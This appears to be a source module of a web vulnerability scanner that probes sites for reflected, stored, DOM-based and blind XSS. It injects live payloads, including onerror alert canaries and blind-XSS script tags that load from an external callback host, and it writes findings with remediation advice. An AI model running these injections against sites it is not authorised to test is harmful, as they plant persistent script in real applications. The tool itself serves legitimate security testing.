"""Cross-site scripting engine.

A context-aware, multi-surface XSS engine that still speaks the one language the
rest of lopata understands: it emits ordinary ``Finding`` objects into the same
severity/confidence/correlation pipeline as every other check, so a Dalfox hit
on the same parameter raises confidence through correlation rather than through
anything special here.

What it covers:

* **Reflected** XSS in URL query parameters, form fields (every input type,
  including hidden), reflected request headers (Referer / User-Agent /
  X-Forwarded-*), and JSON body parameters on API-looking endpoints.
* **Stored** XSS: a unique canary is submitted through forms, then candidate
  pages are re-fetched and checked for unescaped persistence.
* **DOM-based** XSS: verified with a headless browser against URL fragment/query
  sinks (skipped cleanly when Playwright is not installed).
* **Blind** XSS: out-of-band canaries pointing at a user-supplied callback, when
  one is configured — reported as a planted lead, never as confirmed.

For each candidate it probes *which characters survive* encoding, classifies the
reflection *context*, and builds the minimal context-appropriate payload from
the survivors (with bounded case/backtick/handler evasion variants). Reflection
alone is rated High; only headless execution — reproduction — earns Confirmed.
"""

from __future__ import annotations

import asyncio
import uuid
from urllib.parse import (parse_qs, urlencode, urljoin, urlparse, urlunparse)

import requests

from ..core import async_http
from ..core.async_http import AsyncFetcher
from ..core.models import (AREA_WEBAPP, Confidence, Effort, Finding,
                           FindingType, Severity)
from ..core.severity import (AuthRequirement, Exploitability, Exposure, Impact,
                             SeverityFactors, apply)
from . import _xss_headless as headless
from ._xss_payloads import analyze, probe_value

MODULE_NAME = "xss"
CATEGORY = "XSS"

_REFLECT_HEADERS = ("Referer", "User-Agent", "X-Forwarded-For",
                    "X-Forwarded-Host")
_WAF_SIGNS = ("access denied", "request blocked", "web application firewall",
              "forbidden", "cloudflare", "incapsula", "mod_security",
              "your request has been blocked", "malicious")
_WAF_CODES = {403, 406, 419, 429, 501, 503}
_REFS = ["https://cheatsheetseries.owasp.org/cheatsheets/"
         "Cross_Site_Scripting_Prevention_Cheat_Sheet.html"]


def _marker() -> tuple[str, str]:
    tok = uuid.uuid4().hex[:10]
    return f"lx{tok}", tok


def run(ctx, phase=None) -> None:
    ctx.modules_run.append(MODULE_NAME)
    ctx._xss_use_headless = (ctx.config.get("xss_headless", True)
                             and headless.available())
    ctx._xss_storage_state = None
    if ctx._xss_use_headless:
        ctx._xss_storage_state = headless.build_storage_state(
            ctx.session.cookies, ctx.target,
            ctx.config.get("xss_storage_state"))
        out = ctx.config.get("xss_storage_state_out")
        if out and headless.export_storage_state(ctx._xss_storage_state, out):
            ctx.logger and ctx.logger.info("xss: wrote storage state to %s", out)
        n = len(ctx._xss_storage_state.get("cookies", []))
        ctx.logger and ctx.logger.info(
            "xss: headless verification enabled (%d cookie(s) shared)", n)

    reflected_targets = _param_targets(ctx)
    if phase:
        phase.set_total(max(len(reflected_targets), 1) + 4)

    async def _driver():
        async with AsyncFetcher.from_ctx(ctx) as fetcher:
            async def one(method, url, param, data):
                finding = await _test_reflected_param(ctx, fetcher, url, param,
                                                      method, data)
                if finding:
                    ctx.add_finding(finding)
                phase and phase.step()
            await asyncio.gather(*(one(method, url, param, data)
                                   for (method, url, param, data)
                                   in reflected_targets))

    async_http.run(_driver())

    _test_reflected_headers(ctx)
    phase and phase.step()
    _test_json_params(ctx)
    phase and phase.step()
    if ctx.config.get("xss_stored", True):
        _test_stored(ctx)
    phase and phase.step()
    if ctx._xss_use_headless:
        _test_dom(ctx)
    _test_blind(ctx)
    phase and phase.step()
    phase and phase.done()



def _param_targets(ctx) -> list[tuple]:
    """(method, url, param, data) for every reflected-parameter candidate."""
    targets: list[tuple] = []
    seen: set[tuple] = set()

    def add(method, url, param, data):
        key = (method, urlparse(url).path, param)
        if param and key not in seen:
            seen.add(key)
            targets.append((method, url, param, data))

    for url in ctx.discovered_urls:
        for param in parse_qs(urlparse(url).query).keys():
            add("GET", url, param, {})

    for url, params in (ctx.discovered_params or {}).items():
        for param in params:
            add("GET", url, param, {})

    for form in ctx.forms:
        method = (form.get("method") or "get").upper()
        if method not in ("GET", "POST"):
            continue
        action = form.get("action") or ctx.target
        fields = {i["name"]: (i.get("value") or "1")
                  for i in form.get("inputs", [])
                  if i.get("name")
                  and i.get("type") not in ("submit", "button", "image", "file")}
        for param in fields:
            data = {k: v for k, v in fields.items() if k != param}
            add(method, action, param, data)

    if not targets:
        targets.append(("GET", ctx.target.rstrip("/") + "/?q=1", "q", {}))
    return targets



def _inject_query(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [value]
    return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))


async def _send_param(ctx, fetcher, method, url, param, data, value):
    if method == "POST":
        payload = dict(data)
        payload[param] = value
        return await fetcher.post(url, data=payload, allow_redirects=True)
    return await fetcher.get(_inject_query(url, param, value),
                             allow_redirects=True)


def _looks_blocked(clean, resp) -> bool:
    if resp is None:
        return False
    if resp.status_code in _WAF_CODES and (clean is None
                                           or clean.status_code not in _WAF_CODES):
        return True
    low = (resp.text or "").lower()
    return any(s in low for s in _WAF_SIGNS) and not (
        clean is not None and any(s in (clean.text or "").lower()
                                  for s in _WAF_SIGNS))



async def _test_reflected_param(ctx, fetcher, url, param, method, data) -> Finding | None:
    canary, token = _marker()
    probe = probe_value(canary)

    clean = await _send_param(ctx, fetcher, method, url, param, data, f"{canary}clean")
    resp = await _send_param(ctx, fetcher, method, url, param, data, probe)
    if resp is None:
        return None

    waf = _looks_blocked(clean, resp)
    body = resp.text or ""
    if canary not in body:
        return None

    baseline = getattr(getattr(ctx, "baseline", None), "root", None)
    if baseline is not None and canary in (baseline.body or ""):
        return None

    result = analyze(body, canary, token)
    if result is None:
        return None

    if not await _reproduces(ctx, fetcher, method, url, param, data):
        return None

    verified = False
    if (result["exploitable"] and not result["interaction"]
            and method == "GET" and getattr(ctx, "_xss_use_headless", False)):
        payload_url = _inject_query(url, param, result["payload"])
        verified = await asyncio.to_thread(
            headless.verify_execution,
            payload_url, token, min(ctx.timeout + 3, 12),
            not ctx.config.get("verify_tls", True),
            getattr(ctx, "_xss_storage_state", None))
        if waf:
            await asyncio.sleep(0.3)

    return _build_reflected(ctx, method, url, param, result, verified, waf,
                            where="parameter")


async def _reproduces(ctx, fetcher, method, url, param, data, attempts: int = 2) -> bool:
    for _ in range(attempts):
        canary, _ = _marker()
        resp = await _send_param(ctx, fetcher, method, url, param, data, canary)
        if resp is None or canary not in (resp.text or ""):
            return False
    return True


def _build_reflected(ctx, method, url, param, result, verified, waf,
                     where) -> Finding:
    label = result["label"]
    loc_method = "" if method == "GET" else f"{method} "
    location = f"{url} [{loc_method}param: {param}]"

    if verified:
        name = "Reflected cross-site scripting"
        ftype = FindingType.CONFIRMED_VULN
        confidence = Confidence.CONFIRMED
        exploitability = Exploitability.EASY
        impact_level = Impact.SERIOUS
        verified_by = ("lopata executed the payload in a headless browser and "
                       "observed it run")
        detail = (f"Input in `{param}` is reflected into {label} and a "
                  "context-appropriate payload built from the surviving "
                  "characters executed in a real browser engine.")
    elif result["exploitable"]:
        name = "Reflected cross-site scripting"
        ftype = FindingType.POTENTIAL_VULN
        confidence = Confidence.HIGH
        exploitability = (Exploitability.MODERATE if result["interaction"]
                          else Exploitability.EASY)
        impact_level = Impact.SERIOUS
        verified_by = ""
        detail = (f"Input in `{param}` is reflected into {label} with the "
                  "characters needed to break out of that context surviving "
                  "unencoded, so a working payload exists"
                  + (" (it requires the victim to interact with the page)."
                     if result["interaction"] else ". Execution was not "
                     "confirmed with a browser, so this is rated High rather "
                     "than Confirmed."))
    else:
        name = "Unencoded input reflection (possible XSS)"
        ftype = FindingType.POTENTIAL_VULN
        confidence = Confidence.MEDIUM
        exploitability = Exploitability.MODERATE
        impact_level = Impact.LIMITED
        verified_by = ""
        detail = (f"Input in `{param}` is reflected into {label}, but the "
                  "characters needed to break out of that context were encoded "
                  "or stripped. The reflection is real; a break-out was not "
                  "found automatically and manual review is needed to settle it.")

    survived = "".join(sorted(result["survived"])) or "(none of the probed set)"
    notes = ["reflected XSS requires the victim to follow an attacker-supplied "
             "link, which bounds it below stored XSS"]
    if waf:
        notes.append("a filter/WAF response was observed; the payload set was "
                     "shifted to evasion variants but a bypass is not guaranteed")

    finding = Finding(
        name=name,
        severity=Severity.INFO,
        location=location,
        description=(
            detail + f"\n\nDetected context: {label}. Surviving characters: "
            f"{survived}."
            + (f"\nWorking payload: {result['payload']}" if result["payload"]
               else "")
        ),
        remediation="Encode output for the context it lands in, at the point of "
                    "rendering; add a Content-Security-Policy without "
                    "'unsafe-inline'.",
        ftype=ftype,
        module=MODULE_NAME, category=CATEGORY,
        summary=f"`{param}` is reflected into {label}"
                + (" and executed." if verified else " unencoded."),
        risk="The application places attacker-controlled text into the page "
             "without encoding it for the context it lands in; the browser "
             "cannot tell that text from the developer's own markup.",
        impact="Script execution in the victim's session on this origin: reading "
               "session cookies (unless HttpOnly), acting as the user, rewriting "
               "the page to capture credentials, and reaching any API the origin "
               "can.",
        remediation_steps=[
            f"Encode on output for the {label} specifically — HTML-entity "
            "encoding is not sufficient inside a script block or event handler.",
            "Use the template engine's contextual auto-escaping rather than "
            "string concatenation.",
            "Never place user input directly into a <script> block; pass it via "
            "a JSON-encoded data attribute.",
            "Add a Content-Security-Policy without 'unsafe-inline' so a missed "
            "case cannot execute.",
        ],
        verification=(f"Request the URL with `{param}` set to a harmless marker "
                      "and confirm it renders entity-encoded in the page source."),
        references=_REFS,
        effort=Effort.MODERATE,
        score_area=AREA_WEBAPP,
        evidence=f"context={result['context']} quote={result['quote']!r} "
                 f"survived={survived} payload={result['payload']}",
        request=f"{method} {url}  {param}=<context-payload>",
        verified_by=verified_by,
        sources=[MODULE_NAME],
    )
    apply(finding, SeverityFactors(
        impact=impact_level, exploitability=exploitability,
        auth=AuthRequirement.NONE, exposure=Exposure.PUBLIC,
        confidence=confidence, notes=notes))
    return finding



def _test_reflected_headers(ctx) -> None:
    urls = [ctx.target.rstrip("/") + "/"]
    for url in list(ctx.discovered_urls)[:2]:
        if url not in urls:
            urls.append(url)

    for header in _REFLECT_HEADERS:
        for url in urls[:2]:
            canary, token = _marker()
            probe = probe_value(canary)
            try:
                resp = ctx.session.get(url, headers={header: probe},
                                       timeout=ctx.timeout)
            except requests.RequestException:
                continue
            body = resp.text or ""
            if canary not in body:
                continue
            result = analyze(body, canary, token)
            if result is None or not result["exploitable"]:
                continue
            # Confirm it reproduces from the header specifically.
            c2, _ = _marker()
            try:
                r2 = ctx.session.get(url, headers={header: c2},
                                     timeout=ctx.timeout)
            except requests.RequestException:
                continue
            if c2 not in (r2.text or ""):
                continue
            ctx.add_finding(_header_finding(ctx, url, header, result))
            break


def _header_finding(ctx, url, header, result) -> Finding:
    if header.lower() == "referer":
        exploit, note = (Exploitability.MODERATE,
                         "the Referer header is set by the browser when a victim "
                         "follows a link from an attacker-controlled page")
    else:
        exploit, note = (Exploitability.DIFFICULT,
                         f"reflecting the {header} header is exploitable only "
                         "where an attacker can set it (e.g. a proxy position)")
    finding = Finding(
        name=f"Reflected XSS via the {header} header",
        severity=Severity.INFO,
        location=f"{url} [header: {header}]",
        description=(
            f"The value of the `{header}` request header is reflected into "
            f"{result['label']} unencoded, with break-out characters surviving. "
            + note + "."),
        remediation="Encode header values on output exactly like any other "
                    "untrusted input; never treat request headers as safe.",
        ftype=FindingType.POTENTIAL_VULN,
        module=MODULE_NAME, category=CATEGORY,
        summary=f"`{header}` header is reflected unencoded into {result['label']}.",
        risk="Request headers are attacker-influenceable input; reflecting them "
             "unencoded is the same class of bug as reflecting a query "
             "parameter.",
        impact="Script execution in the victim's session where the header can be "
               "controlled.",
        remediation_steps=[
            "Encode the header value for the output context.",
            "Prefer not to echo request headers into responses at all.",
            "Add a Content-Security-Policy without 'unsafe-inline'.",
        ],
        verification=f"Send the request with a marker in `{header}` and confirm "
                     "it renders entity-encoded.",
        references=_REFS,
        effort=Effort.MODERATE,
        score_area=AREA_WEBAPP,
        evidence=f"header={header} context={result['context']} "
                 f"payload={result['payload']}",
        request=f"GET {url}\n{header}: <context-payload>",
        sources=[MODULE_NAME],
    )
    apply(finding, SeverityFactors(
        impact=Impact.SERIOUS, exploitability=exploit,
        auth=AuthRequirement.NONE, exposure=Exposure.PUBLIC,
        confidence=Confidence.HIGH, notes=[note]))
    return finding



def _test_json_params(ctx) -> None:
    api_urls = [u for u in ctx.discovered_urls
                if "/api" in urlparse(u).path.lower()
                or urlparse(u).path.lower().endswith((".json",))][:8]
    for url in api_urls:
        canary, token = _marker()
        probe = probe_value(canary)
        try:
            resp = ctx.session.post(url, json={"q": probe, "search": probe},
                                    timeout=ctx.timeout)
        except requests.RequestException:
            continue
        ctype = resp.headers.get("Content-Type", "").lower()
        body = resp.text or ""
        if canary not in body:
            continue
        html_context = "html" in ctype or "text/plain" in ctype
        result = analyze(body, canary, token)
        if result is None:
            continue
        ctx.add_finding(_json_finding(ctx, url, result, html_context))


def _json_finding(ctx, url, result, html_context) -> Finding:
    if html_context and result["exploitable"]:
        confidence, ftype = Confidence.HIGH, FindingType.POTENTIAL_VULN
        impact, exploit = Impact.SERIOUS, Exploitability.EASY
        extra = ("The endpoint reflected a JSON body parameter into an "
                 "HTML-typed response with break-out characters intact.")
    else:
        confidence, ftype = Confidence.MEDIUM, FindingType.POTENTIAL_VULN
        impact, exploit = Impact.LIMITED, Exploitability.MODERATE
        extra = ("The endpoint reflected a JSON body parameter; whether it is "
                 "exploitable depends on the response content type and any "
                 "client-side rendering of the value.")
    finding = Finding(
        name="XSS via reflected JSON body parameter",
        severity=Severity.INFO,
        location=f"{url} [JSON param: q/search]",
        description=(f"A value sent in the JSON request body is reflected in the "
                     f"response ({result['label']}). " + extra),
        remediation="Encode on output for the context the value is rendered in; "
                    "serve API responses with a correct non-HTML content type "
                    "and X-Content-Type-Options: nosniff.",
        ftype=ftype, module=MODULE_NAME, category=CATEGORY,
        summary="A JSON body parameter is reflected unencoded.",
        risk="API endpoints that echo request data can become XSS sinks when the "
             "response is rendered as HTML or sniffed as such by the browser.",
        impact="Script execution where the reflected value is rendered in an "
               "HTML context on the client.",
        remediation_steps=[
            "Return the correct content type and set X-Content-Type-Options: "
            "nosniff.",
            "Encode the value for its rendering context on the client.",
            "Add a Content-Security-Policy without 'unsafe-inline'.",
        ],
        verification="Post a marker in the JSON body and inspect how the client "
                     "renders the response.",
        references=_REFS, effort=Effort.MODERATE, score_area=AREA_WEBAPP,
        evidence=f"content-html={html_context} context={result['context']} "
                 f"payload={result['payload']}",
        request=f"POST {url}  body={{\"q\": \"<context-payload>\"}}",
        sources=[MODULE_NAME])
    apply(finding, SeverityFactors(
        impact=impact, exploitability=exploit, auth=AuthRequirement.NONE,
        exposure=Exposure.PUBLIC, confidence=confidence,
        notes=["reflected via a JSON API endpoint"]))
    return finding



def _test_stored(ctx) -> None:
    canary, token = _marker()
    payload = f"{canary}<img src=x onerror=alert('{token}')>"
    submitted = 0
    for form in ctx.forms:
        if (form.get("method") or "get").lower() != "post":
            continue
        data = {}
        for inp in form.get("inputs", []):
            name = inp.get("name")
            if not name:
                continue
            itype = inp.get("type", "text")
            if itype in ("submit", "button", "file", "image"):
                continue
            if itype == "email":
                data[name] = f"{canary}@example.com"
            elif itype in ("text", "search", "textarea", "url", "hidden", ""):
                data[name] = payload
            else:
                data[name] = inp.get("value") or "1"
        if not data:
            continue
        try:
            ctx.session.post(form["action"], data=data, timeout=ctx.timeout,
                             allow_redirects=True)
            submitted += 1
        except requests.RequestException:
            continue

    if not submitted:
        return

    pages = (set(ctx.discovered_urls) | {f["page"] for f in ctx.forms}
             | {ctx.target.rstrip("/") + "/"})
    for page in list(pages)[:ctx.max_pages]:
        try:
            resp = ctx.session.get(page, timeout=ctx.timeout)
        except requests.RequestException:
            continue
        body = resp.text or ""
        if canary not in body:
            continue
        result = analyze(body, canary, token)
        if result is None:
            continue
        verified = False
        if getattr(ctx, "_xss_use_headless", False) and result["exploitable"]:
            verified = headless.verify_execution(
                page, token, timeout=min(ctx.timeout + 3, 12),
                insecure=not ctx.config.get("verify_tls", True),
                storage_state=getattr(ctx, "_xss_storage_state", None))
        ctx.add_finding(_stored_finding(ctx, page, result, verified))
        return


def _stored_finding(ctx, page, result, verified) -> Finding:
    if verified:
        confidence, ftype = Confidence.CONFIRMED, FindingType.CONFIRMED_VULN
        verified_by = ("lopata submitted a canary, re-fetched the page, and "
                       "executed it in a headless browser")
        head = ("A payload submitted through a form was persisted and executed "
                "when the page was re-loaded.")
    elif result["exploitable"]:
        confidence, ftype = Confidence.HIGH, FindingType.POTENTIAL_VULN
        verified_by = ("lopata submitted a canary and re-fetched the page to "
                       "observe it rendered unencoded")
        head = ("A canary submitted through a form was persisted and rendered "
                "back unencoded, with break-out characters intact — stored XSS "
                "is very likely, though browser execution was not confirmed.")
    else:
        confidence, ftype = Confidence.MEDIUM, FindingType.POTENTIAL_VULN
        verified_by = "lopata observed the submitted canary persisted on the page"
        head = ("A canary submitted through a form was persisted and reflected, "
                "but break-out characters were encoded where it renders.")

    finding = Finding(
        name="Stored cross-site scripting",
        severity=Severity.INFO, location=page,
        description=(
            head + f"\n\nDetected context: {result['label']}. Stored XSS is the "
            "most severe variant: no crafted link is needed and the payload "
            "runs for every user who views the page, including administrators."),
        remediation="Encode on output at render time, and sanitise rich text "
                    "with a vetted allow-list library on input.",
        ftype=ftype, module=MODULE_NAME, category=CATEGORY,
        summary="Submitted markup is stored and rendered unencoded.",
        risk="Any visitor to this page executes attacker-supplied script in "
             "their own session with no interaction beyond viewing it; payloads "
             "persist until the stored data is cleaned.",
        impact="Session theft and account takeover for every viewer, including "
               "staff and administrators — typically the highest-privileged "
               "account in the application. Self-propagating payloads in shared "
               "content are a routine outcome.",
        remediation_steps=[
            "Encode all stored content on output for its rendering context.",
            "For rich text, run input through a vetted sanitiser (DOMPurify, "
            "Bleach) with an allow-list — never a regex filter.",
            "Audit stored data for payloads already present before deploying.",
            "Add a Content-Security-Policy without 'unsafe-inline'.",
            "Set HttpOnly on session cookies to blunt token theft.",
        ],
        verification="Submit a harmless marker with angle brackets through the "
                     "same form and confirm it renders entity-encoded.",
        references=_REFS, effort=Effort.MODERATE, score_area=AREA_WEBAPP,
        evidence=f"canary rendered on {page}; context={result['context']}",
        request="POST to the discovered form(s), then GET " + page,
        verified_by=verified_by, sources=[MODULE_NAME])
    apply(finding, SeverityFactors(
        impact=Impact.TOTAL, exploitability=Exploitability.EASY,
        auth=AuthRequirement.NONE, exposure=Exposure.PUBLIC,
        confidence=confidence,
        notes=["no user interaction is required beyond viewing the page; stored "
               "XSS is rated above reflected XSS for this reason"]))
    return finding



def _test_dom(ctx) -> None:
    max_urls = int(ctx.config.get("xss_max_dom_urls", 15))
    urls = ([ctx.target.rstrip("/") + "/"]
            + [u for u in sorted(ctx.discovered_urls)][:max_urls])
    seen: set[str] = set()
    for url in urls[:max_urls]:
        base = url.split("#")[0]
        if base in seen:
            continue
        seen.add(base)
        _, token = _marker()
        payload = f'"><img src=x onerror=alert(\'{token}\')>'
        probe_url = base + "#" + payload
        insecure = not ctx.config.get("verify_tls", True)
        if headless.verify_execution(probe_url, token,
                                     timeout=min(ctx.timeout + 3, 12),
                                     insecure=insecure,
                                     storage_state=getattr(
                                         ctx, "_xss_storage_state", None)):
            ctx.add_finding(_dom_finding(ctx, base, token))
            return


def _dom_finding(ctx, url, token) -> Finding:
    finding = Finding(
        name="DOM-based cross-site scripting",
        severity=Severity.INFO, location=f"{url}#<payload>",
        description=(
            "Client-side JavaScript on this page reads the URL fragment and "
            "writes it into a dangerous sink (innerHTML/document.write/eval or "
            "similar) without sanitisation. lopata placed a payload in the "
            "fragment — which is never sent to the server — and a headless "
            "browser executed it, so this is a purely client-side flaw the "
            "server logs will not show."),
        remediation="Never pass untrusted URL data to HTML/script sinks; use "
                    "textContent or a sanitiser, and treat location.hash/search "
                    "as untrusted.",
        ftype=FindingType.CONFIRMED_VULN, module=MODULE_NAME, category=CATEGORY,
        summary="URL fragment reaches a client-side sink and executes.",
        risk="The vulnerability lives entirely in the page's JavaScript; it fires "
             "from a crafted link with no server involvement, which also means "
             "server-side WAFs never see it.",
        impact="Script execution in the victim's session on this origin from a "
               "crafted link.",
        remediation_steps=[
            "Audit uses of location.hash/search/href feeding innerHTML, "
            "document.write, insertAdjacentHTML, eval or jQuery $().html().",
            "Render untrusted values with textContent or sanitise with DOMPurify.",
            "Add a Content-Security-Policy without 'unsafe-inline'.",
        ],
        verification="Load the page with the payload in the fragment and confirm "
                     "it no longer executes once the sink is fixed.",
        references=_REFS + ["https://owasp.org/www-community/attacks/DOM_Based_XSS"],
        effort=Effort.MODERATE, score_area=AREA_WEBAPP,
        evidence=f"headless execution from fragment payload (token {token})",
        request=f"GET {url}#\"><img src=x onerror=alert(...)>",
        verified_by="lopata executed the payload in a headless browser via the "
                    "URL fragment",
        sources=[MODULE_NAME])
    apply(finding, SeverityFactors(
        impact=Impact.SERIOUS, exploitability=Exploitability.EASY,
        auth=AuthRequirement.NONE, exposure=Exposure.PUBLIC,
        confidence=Confidence.CONFIRMED,
        notes=["confirmed by headless execution; the payload never reaches the "
               "server, so this is invisible to server-side filtering"]))
    return finding



def _test_blind(ctx) -> None:
    listener = getattr(ctx, "blind_listener", None)
    callback = listener.base_url if listener is not None \
        else ctx.config.get("xss_blind_callback")
    if not callback:
        return

    planted = 0

    def plant(where: str, context: dict, do_request) -> None:
        nonlocal planted
        _, token = _marker()
        beacon = urljoin(callback + "/", token)
        payload = (f'"><script src="{beacon}"></script>'
                   f'<img src="{beacon}/i.png">')
        if listener is not None:
            listener.register_token(token, {**context, "where": where})
        try:
            do_request(payload)
        except requests.RequestException:
            return
        planted += 1

    for form in ctx.forms:
        if (form.get("method") or "get").lower() != "post":
            continue
        inputs = [inp for inp in form.get("inputs", [])
                  if inp.get("name")
                  and inp.get("type") not in ("submit", "button", "file",
                                              "image")]
        if not inputs:
            continue
        action = form["action"]
        names = [inp["name"] for inp in inputs]

        def do(payload, action=action, names=names):
            ctx.session.post(action, data={n: payload for n in names},
                             timeout=ctx.timeout)

        plant(f"form field(s) {', '.join(names)} at {action}",
              {"url": action, "method": "POST", "params": names}, do)

    base = ctx.target.rstrip("/") + "/"
    for header in _REFLECT_HEADERS:
        def do(payload, header=header):
            ctx.session.get(base, headers={header: payload}, timeout=ctx.timeout)

        plant(f"the {header} request header",
              {"url": base, "method": "GET", "header": header}, do)

    if planted:
        ctx.add_finding(_blind_finding(ctx, callback, planted,
                                       listener is not None))


def _blind_finding(ctx, callback, planted, has_listener) -> Finding:
    if has_listener:
        watch = ("lopata's built-in listener is watching for the callback and "
                 "will promote this to a confirmed finding automatically if one "
                 "arrives during the scan window.")
    else:
        watch = (f"Watch your out-of-band listener at {callback} for a request "
                 "carrying one of the planted tokens.")
    finding = Finding(
        name="Blind XSS canary planted (out-of-band)",
        severity=Severity.INFO, location=ctx.target,
        description=(
            f"lopata planted {planted} out-of-band XSS canary(ies), each with a "
            f"unique token, that call back to {callback}. These target contexts "
            "lopata never observes directly — admin panels, log viewers, support "
            "dashboards. This is a *lead*, not a finding: it is confirmed only if "
            "a callback records a hit, which may happen minutes or days later.\n\n"
            + watch),
        remediation="If the callback fires, treat it as stored XSS in the "
                    "back-office view that rendered it and encode on output there.",
        ftype=FindingType.POTENTIAL_VULN, module=MODULE_NAME, category=CATEGORY,
        summary=f"{planted} blind-XSS canary(ies) planted; awaiting callback.",
        risk="Blind XSS fires in privileged contexts that automated scanning "
             "cannot see, which is exactly why it is dangerous and easy to miss.",
        impact="If it fires in an admin or support view, the impact is that of "
               "stored XSS against a highly privileged user.",
        remediation_steps=[
            "Keep the listener (or your out-of-band service) running to catch "
            "late callbacks.",
            "If one fires, identify the view that rendered it and encode on "
            "output there.",
        ],
        verification=f"Check the listener at {callback} for a request carrying "
                     "one of the planted per-injection tokens.",
        references=_REFS, effort=Effort.MODERATE, score_area=AREA_WEBAPP,
        evidence=f"callback={callback} injections={planted}",
        confidence=Confidence.LOW, sources=[MODULE_NAME])
    apply(finding, SeverityFactors(
        impact=Impact.SERIOUS, exploitability=Exploitability.THEORETICAL,
        auth=AuthRequirement.NONE, exposure=Exposure.PUBLIC,
        confidence=Confidence.LOW,
        notes=["unconfirmed until the out-of-band callback records a hit"]))
    return finding


def register():
    from ..core.plugins import web_module
    return web_module('xss', run, requires_crawl=True, order=110)
